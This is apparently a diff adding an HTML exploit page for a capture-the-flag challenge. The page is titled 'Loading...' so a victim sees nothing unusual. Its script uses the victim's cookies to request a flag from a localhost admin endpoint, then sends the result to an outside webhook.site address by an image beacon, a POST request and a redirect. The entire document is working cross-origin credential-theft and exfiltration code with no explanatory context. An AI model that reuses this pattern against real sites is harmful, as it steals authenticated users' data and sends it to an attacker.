@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+<script>
+// Fetch the flag with admin cookies
+fetch('http://127.0.0.1:5000/api/fetchflag', { 
+    credentials: 'include'
+})
+.then(response => {
+    if (!response.ok) {
+        throw new Error('HTTP error ' + response.status);
+    }
+    return response.json();
+})
+.then(data => {
+    console.log('Flag data:', data);
+    
+    // Method 1: Image beacon (most reliable)
+    var img1 = new Image();
+    img1.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?method=img&flag=' + encodeURIComponent(data.flag);
+    
+    // Method 2: Fetch POST
+    fetch('https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    });
+    
+    // Method 3: Redirect as last resort
+    setTimeout(() => {
+        window.location = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?method=redirect&flag=' + encodeURIComponent(data.flag);
+    }, 1000);
+})
+.catch(error => {
+    console.error('Error:', error);
+    // Send error to webhook
+    var img = new Image();
+    img.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?error=' + encodeURIComponent(error.toString());
+});
+</script>
+</body>
+</html>
